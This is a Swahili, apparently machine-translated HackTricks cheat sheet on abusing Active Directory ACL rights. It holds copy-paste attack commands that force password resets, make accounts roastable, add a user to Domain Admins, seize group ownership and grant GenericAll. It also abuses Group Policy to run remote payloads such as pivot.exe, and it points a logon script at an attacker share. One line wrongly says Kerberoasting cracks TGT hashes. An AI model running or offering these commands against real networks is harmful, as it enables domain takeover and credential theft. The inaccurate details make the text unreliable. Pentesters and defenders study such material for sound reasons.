# Kudhuru ACLs/ACEs za Active Directory

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) **na** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repos za github.**

</details>

**Ukurasa huu kwa kiasi kikubwa ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**

## **Haki za GenericAll kwa Mtumiaji**

Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji lengwa. Mara baada ya kuthibitisha haki za `GenericAll` kwa kutumia amri ya `Get-ObjectAcl`, mshambuliaji anaweza:

* **Kubadilisha Nenosiri la Lengo**: Kwa kutumia `net user <jina la mtumiaji> <neno la siri> /domain`, mshambuliaji anaweza kurejesha neno la siri la mtumiaji.
* **Kerberoasting ya Lengo**: Kutenga SPN kwa akaunti ya mtumiaji ili kuifanya iweze kuroast, kisha tumia Rubeus na targetedKerberoast.py kuchimba na jaribu kuvunja tiketi ya kutoa ruhusa (TGT) hashes.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Kulenga ASREPRoasting**: Lemaza uthibitishaji wa awali kwa mtumiaji, ukifanya akaunti yao kuwa hatarini kwa ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Haki za GenericAll kwenye Kikundi**

Haki hii inamruhusu mshambuliaji kubadilisha uanachama wa kikundi ikiwa wana `Haki za GenericAll` kwenye kikundi kama `Waendeshaji wa Kikoa`. Baada ya kutambua jina la kipekee la kikundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

* **Kujiongeza kwenye Kikundi cha Waendeshaji wa Kikoa**: Hii inaweza kufanywa kupitia amri moja kwa moja au kutumia moduli kama Active Directory au PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Andika kwenye Kompyuta/Mtumiaji**

Kushikilia mamlaka haya kwenye kitu cha kompyuta au akaunti ya mtumiaji inaruhusu:

* **Kerberos Resource-based Constrained Delegation**: Inawezesha kuchukua udhibiti wa kitu cha kompyuta.
* **Shadow Credentials**: Tumia mbinu hii kujifanya kuwa kitu cha kompyuta au akaunti ya mtumiaji kwa kutumia mamlaka ya kuunda siri za kivuli.

## **Andika Mali kwenye Kikundi**

Ikiwa mtumiaji ana haki za `Andika Mali` kwenye vitu vyote kwa kikundi maalum (k.m., `Domain Admins`), wanaweza:

* **Jiweke kwenye Kikundi cha Waadmin wa Kikoa**: Inawezekana kwa kuchanganya amri za `net user` na `Ongeza-NetGroupUser`, mbinu hii inaruhusu kupandishwa kwa mamlaka ndani ya kikoa.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Kujiongeza (Uanachama wa Kujiongeza) kwenye Kikundi**

Haki hii inawezesha wachomaji kujiongeza kwenye vikundi maalum, kama vile `Domain Admins`, kupitia amri zinazobadilisha uanachama wa kikundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo kuruhusu kujiongeza mwenyewe:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Uanachama wa Kujisajili)**

Haki sawa, hii inaruhusu wachomaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii unafanywa na:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **KulazimishaBadilishaNenosiri**

Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` inaruhusu kurekebisha nywila bila kujua nywila ya sasa. Uhakiki wa haki hii na kutumia kwake unaweza kufanywa kupitia PowerShell au zana mbadala za mstari wa amri, zikitoa njia kadhaa za kurejesha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri hizo zinatoka kwa mwaliko wa PowerShell wa kawaida hadi kutumia `rpcclient` kwenye Linux, ikionyesha uwezo wa njia za mashambulizi.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Kuandika Mmiliki kwenye Kikundi**

Ikiwa mshambuliaji anagundua kuwa ana haki za `WriteOwner` juu ya kikundi, wanaweza kubadilisha umiliki wa kikundi kuwa wao wenyewe. Hii ina athari kubwa hasa wakati kikundi husika ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana juu ya sifa za kikundi na uanachama. Mchakato huu unahusisha kutambua kitu sahihi kupitia `Get-ObjectAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, iwe kwa SID au jina.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite kwa Mtumiaji**

Ruhusa hii inamruhusu mshambuliaji kubadilisha mali za mtumiaji. Kwa ushirikiano wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya script ya kuingia kwa mtumiaji ili kutekeleza script yenye nia mbaya wakati wa kuingia kwa mtumiaji. Hii inafanikishwa kwa kutumia amri ya `Set-ADObject` kuboresha mali ya `scriptpath` ya mtumiaji wa lengo ili kuashiria script ya mshambuliaji.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite kwenye Kikundi**

Kwa haki hii, wachomaji wanaweza kubadilisha uanachama wa kikundi, kama vile kuongeza wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kujenga kitu cha uthibitisho, kutumia kuongeza au kuondoa watumiaji kutoka kwenye kikundi, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Umiliki wa kitu cha AD na kuwa na ruhusa za `WriteDACL` kunamwezesha mshambuliaji kujipatia ruhusa za `GenericAll` juu ya kitu hicho. Hii inafanikishwa kupitia mabadiliko ya ADSI, kuruhusu udhibiti kamili juu ya kitu na uwezo wa kubadilisha uanachama wake wa kikundi. Licha ya hivyo, kuna vikwazo vinavyojitokeza wakati wa kujaribu kutumia ruhusa hizi kwa kutumia `Set-Acl` / `Get-Acl` cmdlets za moduli ya Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikisheni kwenye Kikoa (DCSync)**

Shambulio la DCSync linatumia ruhusa maalum za kureplikisha kwenye kikoa kujifanya kuwa Msimamizi wa Kikoa na kusawazisha data, ikiwa ni pamoja na siri za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama vile `DS-Replication-Get-Changes`, ikiruhusu wachomozaji kutoa taarifa nyeti kutoka kwa mazingira ya AD bila ufikiaji moja kwa moja kwa Msimamizi wa Kikoa. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## Uteuzi wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Uteuzi wa GPO

Upatikanaji ulioruhusiwa wa kusimamia Vitu vya Sera ya Kikundi (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama vile `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na mamlaka kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumiwa vibaya kwa madhumuni mabaya, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Pima Ruhusa za GPO

Kutambua GPO zilizopangiliwa vibaya, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu ugunduzi wa GPO ambazo mtumiaji fulani ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta Zilizo na Sera Iliyotekelezwa**: Inawezekana kutambua ni kompyuta zipi sera fulani inatekelezwa, ikisaidia kuelewa wigo wa athari inayowezekana. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zilizotekelezwa kwenye Kompyuta Iliyopewa**: Ili kuona sera zipi zinatekelezwa kwenye kompyuta fulani, amri kama vile `Get-DomainGPO` zinaweza kutumika.

**OU zilizo na Sera Iliyotekelezwa**: Kutambua vitengo vya shirika (OUs) vilivyoathiriwa na sera iliyopewa inaweza kufanywa kwa kutumia `Get-DomainOU`.

### Tumia GPO - New-GPOImmediateTask

GPO zilizopangiliwa vibaya zinaweza kutumiwa kutekeleza nambari, kwa mfano, kwa kuunda kazi iliyopangiliwa mara moja. Hii inaweza kufanywa ili kuongeza mtumiaji kwenye kikundi cha wasimamizi wa mitambo iliyohusika, ikiongeza sana mamlaka:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Moduli ya GroupPolicy - Kutumia GPO

Moduli ya GroupPolicy, ikiwa imewekwa, inaruhusu uundaji na uunganishaji wa GPO mpya, na kuweka mapendeleo kama vile thamani za usajili ili kutekeleza milango ya nyuma kwenye kompyuta zilizoathiriwa. Mbinu hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta ili utekelezwe:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Tumia GPO vibaya

SharpGPOAbuse inatoa njia ya kutumia GPO zilizopo kwa kuongeza kazi au kurekebisha mipangilio bila haja ya kuunda GPO mpya. Zana hii inahitaji marekebisho ya GPO zilizopo au kutumia zana za RSAT kuunda mpya kabla ya kutumia mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Kulazimisha Sasisho la Sera

Visasisho vya GPO kawaida hufanyika kila baada ya dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta ya lengo ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kuwa mabadiliko yoyote kwenye GPO yanatekelezwa bila kusubiri kwa mzunguko wa sasisho la kiotomatiki linalofuata.

### Chini ya Hood

Baada ya ukaguzi wa Kazi zilizopangwa kwa GPO fulani, kama vile `Sera Isiyosanidiwa`, kuongezwa kwa kazi kama vile `evilTask` kunaweza kuthibitishwa. Kazi hizi hujengwa kupitia hati au zana za mstari wa amri zikilenga kubadilisha tabia ya mfumo au kuinua mamlaka.

Muundo wa kazi, kama inavyoonyeshwa kwenye faili ya usanidi ya XML iliyozalishwa na `New-GPOImmediateTask`, unafafanua maelezo ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inaonyesha jinsi kazi zilizopangwa zinavyoelezwa na kusimamiwa ndani ya GPO, kutoa njia ya kutekeleza amri au hati za aina yoyote kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPO pia huruhusu uhariri wa wanachama wa watumiaji na vikundi kwenye mifumo ya lengo. Kwa kuhariri moja kwa moja faili za sera za Watumiaji na Vikundi, wachomozaji wanaweza kuongeza watumiaji kwenye vikundi vya mamlaka, kama vile kikundi cha `wasimamizi` wa ndani. Hii inawezekana kupitia uteuzi wa ruhusa za usimamizi wa GPO, ambayo inaruhusu mabadiliko ya faili za sera kuingiza watumiaji wapya au kubadilisha wanachama wa vikundi.

Faili ya usanidi ya XML kwa Watumiaji na Vikundi inaelezea jinsi mabadiliko haya yanatekelezwa. Kwa kuongeza viingilio kwenye faili hii, watumiaji maalum wanaweza kupewa mamlaka ya juu kwenye mifumo iliyohusika. Njia hii inatoa njia moja kwa moja ya kuinua mamlaka kupitia udanganyifu wa GPO.

Zaidi ya hayo, njia zingine za kutekeleza nambari au kudumisha uthabiti, kama vile kutumia hati za kuingia/kutoka, kuhariri funguo za usajili kwa ajili ya kuanza moja kwa moja, kusakinisha programu kupitia faili za .msi, au kuhariri usanidi wa huduma, pia zinaweza kuzingatiwa. Teknolojia hizi hutoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo ya lengo kupitia udanganyifu wa GPO.

## Marejeo

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
